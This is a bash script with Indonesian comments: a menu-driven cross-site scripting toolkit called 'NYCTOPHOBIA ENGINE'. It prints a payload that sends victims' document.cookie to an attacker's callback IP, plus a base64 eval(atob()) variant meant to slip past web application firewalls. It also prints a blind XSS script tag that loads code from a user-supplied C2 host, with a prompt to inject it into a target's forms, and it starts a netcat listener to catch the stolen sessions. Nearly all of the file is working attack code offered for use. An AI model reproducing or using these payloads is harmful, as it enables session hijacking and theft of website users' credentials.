#!/usr/bin/env bash
C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'

# --- FUNGSI ANTI CRASH SAAT CTRL+C ---
trap_ctrl_c() {
    echo -e "\n${R}[!] Listener stopped by user.${N}"
    sleep 1
}

while true; do
    clear
    echo -e "${C}==================================================${N}"
    echo -e "${W}             NYCTOPHOBIA ENGINE${N}"
    echo -e "${W}             By Bogor X Ploit${N}"
    echo -e "${C}==================================================${N}"
    echo ""

    # Nama-nama tool di sini udah di-stealth (Anti Script Kiddie)
    echo -e "${G}[1]${N} Initiate Basic Session Hook"
    echo -e "${G}[2]${N} Deploy Blind Session Vector"
    echo -e "${G}[3]${N} Start Data Exfiltration Listener"
    echo -e "${G}[4]${N} Back to Main Menu"
    echo -e "${C}--------------------------------------------------${N}"

    echo -ne "${Y}Select option > ${N}"
    read -r xss_choice

    case "$xss_choice" in
        1)
            echo -ne "${Y}Enter Target URL > ${N}"
            read -r target
            if [ -z "$target" ]; then
                echo -e "${R}[!] Error: Target URL cannot be empty.${N}"
                sleep 1.5
                continue
            fi

            echo -ne "${Y}Enter Callback IP > ${N}"
            read -r callback_url
            if [ -z "$callback_url" ]; then
                echo -e "${R}[!] Error: Callback IP cannot be empty.${N}"
                sleep 1.5
                continue
            fi
            
            echo -e "${G}[+] Initializing WAF Bypass...${N}"
            sleep 1
            
            # Payload dasar
            RAW_PAYLOAD="<script>new Image().src='http://${callback_url}:2010/?c='+document.cookie;</script>"
            
            # Encode ke Base64 biar lolos WAF
            B64_PAYLOAD=$(echo -n "$RAW_PAYLOAD" | base64 -w 0)
            STEALTH_PAYLOAD="<script>eval(atob('${B64_PAYLOAD}'));</script>"
            
            echo -e "${W}Raw Vector:${N} $RAW_PAYLOAD"
            echo -e "${W}WAF Bypass Vector:${N} $STEALTH_PAYLOAD"
            echo -e "${Y}[*] Use the WAF Bypass Vector on target.${N}"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        2)
            echo -ne "${Y}Enter Your C2 Receiver URL > ${N}"
            read -r c2_url
            if [ -z "$c2_url" ]; then
                echo -e "${R}[!] Error: C2 Receiver URL cannot be empty.${N}"
                sleep 1.5
                continue
            fi

            echo -e "${G}[+] Deploying Blind Vector...${N}"
            sleep 1
            
            PAYLOAD="<script src=\"http://${c2_url}:2010/blind.js\"></script>"
            echo -e "${W}Vector:${N} $PAYLOAD"
            echo -e "${Y}[*] Inject this into target's input forms.${N}"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        3)
            echo -e "${G}[+] Starting Data Exfiltration Listener on port 2010...${N}"
            echo -e "${Y}[!] Waiting for incoming sessions... (Press CTRL+C to stop)${N}"
            
            # Trap sinyal CTRL+C biar ga mental ke prompt PC
            trap trap_ctrl_c SIGINT
            
            if command -v nc >/dev/null 2>&1; then
                nc -lvnp 2010
            elif command -v ncat >/dev/null 2>&1; then
                ncat -lvnp 2010
            fi
            
            # Reset trap
            trap - SIGINT
            echo ""
            read -p "Press Enter to continue..."
            ;;
        4) exit 0 ;;
        *) echo -e "${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
